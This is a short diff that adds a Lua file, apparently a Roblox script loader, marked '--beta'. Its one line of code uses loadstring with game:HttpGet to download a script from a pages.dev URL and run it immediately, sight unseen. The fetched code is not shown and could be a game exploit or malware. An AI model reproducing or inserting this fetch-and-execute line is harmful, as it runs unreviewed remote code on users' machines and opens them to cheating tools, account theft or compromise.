@@ -1,0 +1,2 @@
+--beta
+loadstring(game:HttpGet("https://scriptsbinsauth.pages.dev/api/scripts/5855b11c-810d-4174-86c3-16f718e7c956/raw"))()
